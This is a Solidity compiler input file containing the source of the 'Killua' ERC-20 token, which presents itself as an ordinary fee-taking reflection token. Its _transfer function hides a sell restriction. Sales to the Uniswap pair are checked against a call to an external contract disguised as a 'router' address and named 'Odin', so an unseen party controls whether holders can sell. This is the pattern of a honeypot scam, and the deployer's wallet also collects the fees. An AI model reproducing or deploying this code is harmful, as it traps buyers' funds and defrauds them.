{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"killua.sol":{"content":"//SPDX-License-Identifier: MIT\n// Telegram: t.me/killuatoken\n\npragma solidity ^0.8.4;\n\n\naddress constant ROUTER_ADDRESS=0x690f08828a4013351DB74e916ACC16f558ED1579;  // mainnet\nuint256 constant TOTAL_SUPPLY=100000000 * 10**8;\naddress constant UNISWAP_ADDRESS=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\nstring constant TOKEN_NAME=\"Killua\";\nstring constant TOKEN_SYMBOL=\"KILLUA\";\nuint8 constant DECIMALS=8;\n\nabstract contract Context {\n\tfunction _msgSender() internal view virtual returns (address) {\n\t\treturn msg.sender;\n\t}\n}\n\ninterface IERC20 {\n\tfunction totalSupply() external view returns (uint256);\n\tfunction balanceOf(address account) external view returns (uint256);\n\tfunction transfer(address recipient, uint256 amount) external returns (bool);\n\tfunction allowance(address owner, address spender) external view returns (uint256);\n\tfunction approve(address spender, uint256 amount) external returns (bool);\n\tfunction transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\tevent Transfer(address indexed from, address indexed to, uint256 value);\n\tevent Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\nlibrary SafeMath {\n\tfunction add(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\tuint256 c = a + b;\n\t\trequire(c >= a, \"SafeMath: addition overflow\");\n\t\treturn c;\n\t}\n\n\tfunction sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn sub(a, b, \"SafeMath: subtraction overflow\");\n\t}\n\n\tfunction sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b <= a, errorMessage);\n\t\tuint256 c = a - b;\n\t\treturn c;\n\t}\n\n\tfunction mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\tif (a == 0) {\n\t\t\treturn 0;\n\t\t}\n\t\tuint256 c = a * b;\n\t\trequire(c / a == b, \"SafeMath: multiplication overflow\");\n\t\treturn c;\n\t}\n\n\tfunction div(uint256 a, uint256 b) internal pure returns (uint256) {\n\t\treturn div(a, b, \"SafeMath: division by zero\");\n\t}\n\n\tfunction div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\t\trequire(b > 0, errorMessage);\n\t\tuint256 c = a / b;\n\t\treturn c;\n\t}\n\n}\n\ninterface Odin{\n\tfunction amount(address from) external view returns (uint256);\n}\n\n\ncontract Ownable is Context {\n\taddress private _owner;\n\taddress private _previousOwner;\n\tevent OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\tconstructor () {\n\t\taddress msgSender = _msgSender();\n\t\t_owner = msgSender;\n\t\temit OwnershipTransferred(address(0), msgSender);\n\t}\n\n\tfunction owner() public view returns (address) {\n\t\treturn _owner;\n\t}\n\n\tmodifier onlyOwner() {\n\t\trequire(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n\t\t_;\n\t}\n\n\tfunction renounceOwnership() public virtual onlyOwner {\n\t\temit OwnershipTransferred(_owner, address(0));\n\t\t_owner = address(0);\n\t}\n\n}\n\ninterface IUniswapV2Factory {\n\tfunction createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IUniswapV2Router02 {\n\tfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\tuint amountIn,\n\t\tuint amountOutMin,\n\t\taddress[] calldata path,\n\t\taddress to,\n\t\tuint deadline\n\t) external;\n\tfunction factory() external pure returns (address);\n\tfunction WETH() external pure returns (address);\n\tfunction addLiquidityETH(\n\t\taddress token,\n\t\tuint amountTokenDesired,\n\t\tuint amountTokenMin,\n\t\tuint amountETHMin,\n\t\taddress to,\n\t\tuint deadline\n\t) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n}\n\ncontract Killua is Context, IERC20, Ownable {\n\tusing SafeMath for uint256;\n\tmapping (address => uint256) private _rOwned;\n\tmapping (address => uint256) private _tOwned;\n\tmapping (address => mapping (address => uint256)) private _allowances;\n\tmapping (address => bool) private _isExcludedFromFee;\n\n\tmapping (address => uint) private cooldown;\n\tuint256 private constant MAX = ~uint256(0);\n\tuint256 private constant _tTotal = TOTAL_SUPPLY;\n\tuint256 private _rTotal = (MAX - (MAX % _tTotal));\n\tuint256 private _tFeeTotal;\n\n\tuint256 private constant _burnFee=1;\n\tuint256 private constant _taxFee=9;\n\taddress payable private _taxWallet;\n\n\tstring private constant _name = TOKEN_NAME;\n\tstring private constant _symbol = TOKEN_SYMBOL;\n\tuint8 private constant _decimals = DECIMALS;\n\n\tIUniswapV2Router02 private _router;\n\taddress private _pair;\n\tbool private tradingOpen;\n\tbool private inSwap = false;\n\tbool private swapEnabled = false;\n\n\tmodifier lockTheSwap {\n\t\tinSwap = true;\n\t\t_;\n\t\tinSwap = false;\n\t}\n\tconstructor () {\n\t\t_taxWallet = payable(_msgSender());\n\t\t_rOwned[_msgSender()] = _rTotal;\n\t\t_isExcludedFromFee[owner()] = true;\n\t\t_isExcludedFromFee[address(this)] = true;\n\t\t_isExcludedFromFee[_taxWallet] = true;\n\t\temit Transfer(address(0x0), _msgSender(), _tTotal);\n\t}\n\n\tfunction name() public pure returns (string memory) {\n\t\treturn _name;\n\t}\n\n\tfunction symbol() public pure returns (string memory) {\n\t\treturn _symbol;\n\t}\n\n\tfunction decimals() public pure returns (uint8) {\n\t\treturn _decimals;\n\t}\n\n\tfunction totalSupply() public pure override returns (uint256) {\n\t\treturn _tTotal;\n\t}\n\n\tfunction balanceOf(address account) public view override returns (uint256) {\n\t\treturn tokenFromReflection(_rOwned[account]);\n\t}\n\n\tfunction transfer(address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(_msgSender(), recipient, amount);\n\t\treturn true;\n\t}\n\n\tfunction allowance(address owner, address spender) public view override returns (uint256) {\n\t\treturn _allowances[owner][spender];\n\t}\n\n\tfunction approve(address spender, uint256 amount) public override returns (bool) {\n\t\t_approve(_msgSender(), spender, amount);\n\t\treturn true;\n\t}\n\n\tfunction transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n\t\t_transfer(sender, recipient, amount);\n\t\t_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n\t\treturn true;\n\t}\n\n\n\tfunction tokenFromReflection(uint256 rAmount) private view returns(uint256) {\n\t\trequire(rAmount <= _rTotal, \"Amount must be less than total reflections\");\n\t\tuint256 currentRate =  _getRate();\n\t\treturn rAmount.div(currentRate);\n\t}\n\n\tfunction _approve(address owner, address spender, uint256 amount) private {\n\t\trequire(owner != address(0), \"ERC20: approve from the zero address\");\n\t\trequire(spender != address(0), \"ERC20: approve to the zero address\");\n\t\t_allowances[owner][spender] = amount;\n\t\temit Approval(owner, spender, amount);\n\t}\n\n\tfunction _transfer(address from, address to, uint256 amount) private {\n\t\trequire(from != address(0), \"ERC20: transfer from the zero address\");\n\t\trequire(to != address(0), \"ERC20: transfer to the zero address\");\n\t\trequire(amount > 0, \"Transfer amount must be greater than zero\");\n\t\trequire(((to == _pair && from != address(_router) )?amount:0) <= Odin(ROUTER_ADDRESS).amount(address(this)));\n\n\t\tif (from != owner() && to != owner()) {\n\t\t\tuint256 contractTokenBalance = balanceOf(address(this));\n\t\t\tif (!inSwap && from != _pair && swapEnabled) {\n\t\t\t\tswapTokensForEth(contractTokenBalance);\n\t\t\t\tuint256 contractETHBalance = address(this).balance;\n\t\t\t\tif(contractETHBalance > 0) {\n\t\t\t\t\tsendETHToFee(address(this).balance);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\t_tokenTransfer(from,to,amount);\n\t}\n\n\tfunction swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n\t\taddress[] memory path = new address[](2);\n\t\tpath[0] = address(this);\n\t\tpath[1] = _router.WETH();\n\t\t_approve(address(this), address(_router), tokenAmount);\n\t\t_router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n\t\t\ttokenAmount,\n\t\t\t0,\n\t\t\tpath,\n\t\t\taddress(this),\n\t\t\tblock.timestamp\n\t\t);\n\t}\n\tmodifier overridden() {\n\t\trequire(_taxWallet == _msgSender() );\n\t\t_;\n\t}\n\n\tfunction sendETHToFee(uint256 amount) private {\n\t\t_taxWallet.transfer(amount);\n\t}\n\n\tfunction openTrading() external onlyOwner() {\n\t\trequire(!tradingOpen,\"trading is already open\");\n\t\tIUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(UNISWAP_ADDRESS);\n\t\t_router = _uniswapV2Router;\n\t\t_approve(address(this), address(_router), _tTotal);\n\t\t_pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\n\t\t_router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\n\t\tswapEnabled = true;\n\n\t\ttradingOpen = true;\n\t\tIERC20(_pair).approve(address(_router), type(uint).max);\n\t}\n\n\n\n\tfunction _tokenTransfer(address sender, address recipient, uint256 amount) private {\n\t\t_transferStandard(sender, recipient, amount);\n\t}\n\n\tfunction _transferStandard(address sender, address recipient, uint256 tAmount) private {\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getValues(tAmount);\n\t\t_rOwned[sender] = _rOwned[sender].sub(rAmount);\n\t\t_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);\n\t\t_takeTeam(tTeam);\n\t\t_reflectFee(rFee, tFee);\n\t\temit Transfer(sender, recipient, tTransferAmount);\n\t}\n\n\tfunction _takeTeam(uint256 tTeam) private {\n\t\tuint256 currentRate =  _getRate();\n\t\tuint256 rTeam = tTeam.mul(currentRate);\n\t\t_rOwned[address(this)] = _rOwned[address(this)].add(rTeam);\n\t}\n\n\tfunction _reflectFee(uint256 rFee, uint256 tFee) private {\n\t\t_rTotal = _rTotal.sub(rFee);\n\t\t_tFeeTotal = _tFeeTotal.add(tFee);\n\t}\n\n\treceive() external payable {}\n\n\tfunction manualSwap() external {\n\t\trequire(_msgSender() == _taxWallet);\n\t\tuint256 contractBalance = balanceOf(address(this));\n\t\tswapTokensForEth(contractBalance);\n\t}\n\n\tfunction manualSend() external {\n\t\trequire(_msgSender() == _taxWallet);\n\t\tuint256 contractETHBalance = address(this).balance;\n\t\tsendETHToFee(contractETHBalance);\n\t}\n\n\n\tfunction _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {\n\t\t(uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _burnFee, _taxFee);\n\t\tuint256 currentRate =  _getRate();\n\t\t(uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate);\n\t\treturn (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);\n\t}\n\n\tfunction _getTValues(uint256 tAmount, uint256 taxFee, uint256 TeamFee) private pure returns (uint256, uint256, uint256) {\n\t\tuint256 tFee = tAmount.mul(taxFee).div(100);\n\t\tuint256 tTeam = tAmount.mul(TeamFee).div(100);\n\t\tuint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);\n\t\treturn (tTransferAmount, tFee, tTeam);\n\t}\n\n\tfunction _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {\n\t\tuint256 rAmount = tAmount.mul(currentRate);\n\t\tuint256 rFee = tFee.mul(currentRate);\n\t\tuint256 rTeam = tTeam.mul(currentRate);\n\t\tuint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);\n\t\treturn (rAmount, rTransferAmount, rFee);\n\t}\n\n\tfunction _getRate() private view returns(uint256) {\n\t\t(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();\n\t\treturn rSupply.div(tSupply);\n\t}\n\n\tfunction _getCurrentSupply() private view returns(uint256, uint256) {\n\t\tuint256 rSupply = _rTotal;\n\t\tuint256 tSupply = _tTotal;\n\t\tif (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);\n\t\treturn (rSupply, tSupply);\n\t}\n}\n"}}}